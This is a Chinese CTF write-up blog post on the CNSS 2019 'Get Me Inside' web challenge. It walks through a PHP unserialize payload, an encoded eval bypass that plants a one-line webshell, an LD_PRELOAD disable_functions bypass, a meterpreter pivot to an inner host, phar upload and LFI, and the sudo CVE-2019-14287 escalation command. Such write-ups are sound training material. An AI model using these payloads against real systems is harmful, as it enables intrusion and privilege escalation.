@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="noodp" name="robots"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible"/>
+<title>CNSS Recruit 2019 Web Boss题 WriteUp - X5tar's Blog</title><meta content="" name="Description"/><meta content="CNSS Recruit 2019 Web Boss题 WriteUp" property="og:title"/>
+<meta content="0x00 吐槽思考 for [BOSS] Get Me Inside 这道题肝的是真的爽，从 ddl 前一天晚上开始，搞到 ddl 当天凌晨四点多~~（原来我的肝这么好）~~ 这是一道涉及面广泛的题，考虑到了" property="og:description"/>
+<meta content="article" property="og:type"/>
+<meta content="https://x5tar.com/posts/cnss-recruit-2019-web-boss/" property="og:url"/><meta content="posts" property="article:section"/>
+<meta content="2019-10-24T23:18:36+08:00" property="article:published_time"/>
+<meta content="2019-10-24T23:18:36+08:00" property="article:modified_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="CNSS Recruit 2019 Web Boss题 WriteUp" name="twitter:title"/>
+<meta content="0x00 吐槽思考 for [BOSS] Get Me Inside 这道题肝的是真的爽，从 ddl 前一天晚上开始，搞到 ddl 当天凌晨四点多~~（原来我的肝这么好）~~ 这是一道涉及面广泛的题，考虑到了" name="twitter:description"/>
+<meta content="X5tar's Blog" name="application-name"/>
+<meta content="X5tar's Blog" name="apple-mobile-web-app-title"/><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/><link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/><link href="/site.webmanifest" rel="manifest"/><link href="https://x5tar.com/posts/cnss-recruit-2019-web-boss/" rel="canonical"/><link href="https://x5tar.com/posts/cnss-recruit-2019-web/" rel="prev"/><link href="https://x5tar.com/posts/flask-debug-pin/" rel="next"/><link href="/lib/normalize/normalize.min.css" rel="stylesheet"/><link href="/css/style.min.css" rel="stylesheet"/><link href="/lib/fontawesome-free/all.min.css" rel="stylesheet"/><link href="/lib/animate/animate.min.css" rel="stylesheet"/><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CNSS Recruit 2019 Web Boss题 WriteUp",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/x5tar.com\/posts\/cnss-recruit-2019-web-boss\/"
+        },"genre": "posts","keywords": "CNSS, WriteUp","wordcount":  1734 ,
+        "url": "https:\/\/x5tar.com\/posts\/cnss-recruit-2019-web-boss\/","datePublished": "2019-10-24T23:18:36+08:00","dateModified": "2019-10-24T23:18:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "X5tar"},"author": {
+                "@type": "Person",
+                "name": "X5tar"
+            },"description": ""
+    }
+    </script></head>
+<body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+<div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu">
+<div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+<input id="search-input-desktop" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-desktop" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-desktop" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-desktop">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class="mobile" id="header-mobile">
+<div class="header-container">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu-toggle" id="menu-toggle-mobile">
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class="menu" id="menu-mobile"><div class="search-wrapper">
+<div class="search mobile" id="search-mobile">
+<input id="search-input-mobile" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-mobile" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-mobile" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-mobile">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a class="search-cancel" href="javascript:void(0);" id="search-cancel-mobile">
+                        取消
+                    </a>
+</div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+<div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+<div class="container"><div class="toc" id="toc-auto">
+<h2 class="toc-title">目录</h2>
+<div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">CNSS Recruit 2019 Web Boss题 WriteUp</h1><div class="post-meta">
+<div class="post-meta-line"><span class="post-author"><a class="author" href="/" rel="author" title="Author"><i class="fas fa-user-circle fa-fw"></i>X5tar</a></span> <span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+<div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i> <time datetime="2019-10-24">2019-10-24</time> <i class="fas fa-pencil-alt fa-fw"></i> 约 1734 字 
+                <i class="far fa-clock fa-fw"></i> 预计阅读 4 分钟 </div>
+</div><div class="details toc" id="toc-static" kept="">
+<div class="details-summary toc-title">
+<span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-吐槽思考-for-boss-get-me-inside">0x00 吐槽思考 for [BOSS] Get Me Inside</a></li>
+<li><a href="#0x01-反序列化漏洞">0x01 反序列化漏洞</a></li>
+<li><a href="#0x02-get-shell">0x02 get shell</a></li>
+<li><a href="#0x03-内网穿透">0x03 内网穿透</a></li>
+<li><a href="#0x04-get-shell-again">0x04 get shell <strong>Again</strong></a></li>
+<li><a href="#0x05-读取-flag-文件">0x05 读取 flag 文件</a></li>
+</ul>
+</nav></div>
+</div><div class="content" id="content"><h2 id="0x00-吐槽思考-for-boss-get-me-inside">0x00 <del>吐槽</del>思考 for [BOSS] Get Me Inside</h2>
+<p>这道题肝的是真的爽，从 ddl 前一天晚上开始，搞到 ddl 当天凌晨四点多~~（原来我的肝这么好）~~
+这是一道涉及面广泛的题，考虑到了实战的一些情况，考察多方面的知识，是一道不可多得的好题（即使如此，我依旧想暴打各位出题人emmm）</p>
+<h2 id="0x01-反序列化漏洞">0x01 反序列化漏洞</h2>
+<p>打开这道题首先就是一堆 PHP 源码，直接就摆上了一大堆 <code>class</code> ，先暂时略过这些 <code>class</code> ，继续向下看，我们会发现在源码的末尾有这么一段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'p'</span><span class="p">];</span>
+<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$flag</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
+    <span class="o">...</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>结合上边的一大堆 <code>class</code> ，考虑利用反序列化漏洞，层层递进，最终将变量 <code>flag</code> 的值设为 <code>1</code> 即可，故构造以下 payload （这里可以直接复制粘贴，然后自己写一个脚本把需要的变量序列化一下即可）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?p=O:4:"Deep":2:{s:2:"m1";O:4:"Dark":2:{s:2:"m1";O:7:"Fantasy":2:{s:2:"m1";O:5:"Happy":2:{s:2:"m1";O:8:"New_year":2:{s:2:"s1";O:21:"Copied_from_somewhere":0:{}s:2:"s2";N;}s:2:"m2";N;}s:2:"m2";N;}s:2:"m2";N;}s:2:"m2";N;}
+</code></pre></td></tr></table>
+</div>
+</div><p>输入后发现在未提供参数 <code>c</code> 的情况下输出了 <code>?</code> ，可知成功将 <code>flag</code> 设为 <code>1</code></p>
+<h2 id="0x02-get-shell">0x02 get shell</h2>
+<p>之后查看最后的一段源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"?"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
+ <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">37</span><span class="p">){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"这么长会死的!"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">"/[A-Za-z0-9^!]+/"</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"Catch you!"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>考虑通过 <code>eval</code> 这个函数调用其他函数拿到系统 shell ，然而首先要面对的问题就是这个可恶的正则，你注入的代码中不能包含任何字母、数字和 <code>^</code> <code> !</code> 两种符号
+这里可以使用 PHP 的另一种函数调用方式 <code>(函数名)(参数)</code> ，然后函数名和参数都采用按位取反的方式，通过url编码和 <code>~</code> 运算符调用函数
+然后我们非常高兴的执行了 <code>system('whoami')</code> ，但是，什么都没有发生，看一下 <code>phpinfo()</code> ，发现几乎所有能拿到系统shell的函数都在 <code>disable_functions</code> 里，然后考虑绕过 <code>disable_functions</code> 的方法，经过多方查找，最后选择了通过 <code>LD_PRELOAD</code> 的方式绕过，但这种方法需要上传文件，所以继续构造 payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?p=O:4:%22Deep%22:2:{s:2:%22m1%22;O:4:%22Dark%22:2:{s:2:%22m1%22;O:7:%22Fantasy%22:2:{s:2:%22m1%22;O:5:%22Happy%22:2:{s:2:%22m1%22;O:8:%22New_year%22:2:{s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:{}s:2:%22s2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}&amp;c=(~%9e%8c%8c%9a%8d%8b)(${~%a0%b8%ba%ab}[%aa]);&amp;%aa=eval($_POST['aaa']);
+</code></pre></td></tr></table>
+</div>
+</div><p>这里我们采用另一个可以执行 PHP 语句的函数 <code>assert</code> ，但由于 <code>assert</code> 一次只能执行一条语句，我们可以在其中再加入一个 <code>eval</code> ，这里便出现了我们熟悉的一句话木马，二话不说扔到蚁剑里，发现 shell 依然无法使用，但可以读取和上传文件（这里是因为读取和上传文件可以用 PHP 自带的其它函数实现，所以不需要拿到 shell 就可以），由于 hint 告诉我们对 <code>html</code> 目录没有写权限，故考虑另一个目录 <code>/tmp</code> ，测试后发现有写权限，故可以上传构造的 <code>so</code> 文件进行进一步操作（但当时服务器里有不知哪位好心的大哥留下的 <code>so</code> 文件，我就直接拿来用了，后来知道那个文件<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" rel="noopener noreffer" target="_blank">出自此处</a>，这个构造的十分巧妙，使用了另一个环境变量，配合 PHP 实现一次编译即可执行任意命令，无需每次修改命令都要重新编译，学到了)，然后 <code>include</code> 一下配套的 PHP 文件，按照 PHP 里的参数配置一下，成功拿到系统shell</p>
+<h2 id="0x03-内网穿透">0x03 内网穿透</h2>
+<p>由于 hint 给出了 <code>LAN &amp; ARP</code> ，这里考虑 flag 可能存在于另一台服务器（记为服务器2）上，用 <code>arp -a</code> 看一下，发现有这么一个 IP 与众不同</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0
+</code></pre></td></tr></table>
+</div>
+</div><p><code>curl</code> 看一下，发现有一个网页可以上传文件，考虑将服务器2的80端口转发出来，可以采用 msf 的 <code>meterpreter</code> 模块（这里需要自己有一个公网 IP ，我选择开了一个 VPS ，一般来说再将 VPS 端口转发到本地比较安全，但我为了方便直接在 VPS 上装了个 msf ，毕竟用完即删）
+先用 <code>msfvenom</code> 做个木马，然后用蚁剑上传到服务器1，给一下执行权限，接下来在 <code>msfconsole</code> 中监听木马设置的端口，然后再服务器1中运行木马，拿到 <code>meterpreter shell</code>，然后用 <code>portfwd</code> 进行端口转发，打开转发到服务器上的端口，成功打开服务器2上的网页</p>
+<h2 id="0x04-get-shell-again">0x04 get shell <strong>Again</strong></h2>
+<p>打开页面，发现似乎可以上传什么东西，观察 url 有 <code>/?file=index</code> ，点击上传后 url 变化但页面并未变化，尝试去掉最后的 <code>.php</code> ，发现成功打开上传页面，可以判断 <code>file</code> 是一个 <code>include</code> 漏洞，尝试 <code>php伪协议</code> 读取源码，构造以下 payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?file=php://filter/read=convert.base64-encode/resource=upload
+</code></pre></td></tr></table>
+</div>
+</div><p>成功读到 <code>upload.php</code> 的源码（我第一次做的时候的确读到了源码，但再次尝试却发现读不到了QAQ）
+观察上传页面，发现并无表单可以提交，就在本地写一个表单提交到服务器2，尝试发现只能上传 png 文件，由于 hint 指出了 <code>Phar</code> ，于是写一个一句话木马，打包成 <code>zip</code>（注意打包时选择不压缩），然后将拓展名改为 <code>png</code> ，成功上传，得到上传后的文件名，构造以下 payload（注意最后的木马名不需要 <code>.php</code>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?file=phar://pic/文件名/木马名
+</code></pre></td></tr></table>
+</div>
+</div><p>看一下 <code>phpinfo</code> ，发现拿 shell 的函数并没有被禁用，直接拿到系统shell（这里我想再扔到蚁剑里，但莫名其妙连不上，就手动操作了）</p>
+<h2 id="0x05-读取-flag-文件">0x05 读取 flag 文件</h2>
+<p>根据 hint ，只有 root 用户可以读取 flag 文件，尝试 <code>sudo cat</code>，发现并不能读取，<code>sudo -l</code> 看一下权限，发现权限设置如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(ALL,!root) NOPASSWD:/bin/cat
+</code></pre></td></tr></table>
+</div>
+</div><p>直接使用 <code>sudo</code> 无法使用 <code>cat</code> ，这里我探索了接近两小时终于搜到了一个神奇的漏洞 <code>CVE-2019-14287</code> ，漏洞具体信息可以参考我好不容易搜到的的<a href="https://www.agesec.com/8369.html" rel="noopener noreffer" target="_blank">这个网站</a>
+根据这个漏洞执行以下命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u#-1 /bin/cat /flag
+</code></pre></td></tr></table>
+</div>
+</div><p>成功获得 flag！！！（泪目）</p>
+</div><div class="post-footer" id="post-footer">
+<div class="post-info">
+<div class="post-info-line">
+<div class="post-info-mod">
+<span>更新于 2019-10-24</span>
+</div>
+<div class="post-info-license"></div>
+</div>
+<div class="post-info-line">
+<div class="post-info-md"><span>
+<a class="link-to-markdown" href="/posts/cnss-recruit-2019-web-boss/index.md" target="_blank">阅读原始文档</a>
+</span></div>
+<div class="post-info-share">
+<span></span>
+</div>
+</div>
+</div>
+<div class="post-info-more">
+<section class="post-tags"><i class="fas fa-tags fa-fw"></i> <a href="/tags/cnss/">CNSS</a>, <a href="/tags/writeup/">WriteUp</a></section>
+<section>
+<span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span> | <span><a href="/">主页</a></span>
+</section>
+</div>
+<div class="post-nav"><a class="prev" href="/posts/cnss-recruit-2019-web/" rel="prev" title="CNSS Recruit 2019 Web WriteUp"><i class="fas fa-angle-left fa-fw"></i>CNSS Recruit 2019 Web WriteUp</a>
+<a class="next" href="/posts/flask-debug-pin/" rel="next" title="关于 Flask Debug PIN 的安全性问题">关于 Flask Debug PIN 的安全性问题<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div class="comment" id="valine"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+</main><footer class="footer">
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.83.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span></div>
+</div>
+</footer></div>
+<div id="fixed-buttons"><a class="fixed-button" href="#" id="back-to-top" title="回到顶部">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a class="fixed-button" href="#" id="view-comments" title="查看评论">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><link href="/lib/valine/valine.min.css" rel="stylesheet"/><link href="/lib/lightgallery/lightgallery.min.css" rel="stylesheet"/><script src="/lib/valine/Valine.min.js" type="text/javascript"></script><script src="/lib/smooth-scroll/smooth-scroll.min.js" type="text/javascript"></script><script src="/lib/autocomplete/autocomplete.min.js" type="text/javascript"></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" type="text/javascript"></script><script src="/lib/lazysizes/lazysizes.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lightgallery.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-thumbnail.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-zoom.min.js" type="text/javascript"></script><script src="/lib/clipboard/clipboard.min.js" type="text/javascript"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"iAbQo5y0XlBlUP9F0K3Tyx8f-MdYXbMMI","appKey":"ML5YMAAFe45gCJawVJcUkrg0","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":null,"highlight":true,"lang":"zh-cn","placeholder":"你的评论 ...","recordIP":null,"visitor":null}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"3M3B3KM4LG","algoliaIndex":"blog","algoliaSearchKey":"babfa85706a3a4a0025db8ff2fdf3525","highlightTag":null,"maxResultLength":null,"noResultsFound":"没有找到结果","snippetLength":null,"type":"algolia"}};</script><script src="/js/theme.min.js" type="text/javascript"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'UA-160185073-2');
+        </script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-160185073-2" type="text/javascript"></script></body>
+</html>
